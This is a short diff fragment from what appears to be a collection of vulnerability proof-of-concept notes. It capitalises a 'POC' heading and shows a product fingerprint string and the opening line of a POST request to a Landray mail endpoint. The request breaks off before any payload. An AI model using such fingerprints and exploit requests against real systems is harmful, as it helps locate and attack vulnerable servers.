@@ -8,7 +8,7 @@
 body="/Scripts/jquery.landray.dialog.js"
 ```
 
-## poc
+## POC
 ```
 POST /mail/mail_server.aspx/mail_xml?type=add HTTP/1.1
 Host: 
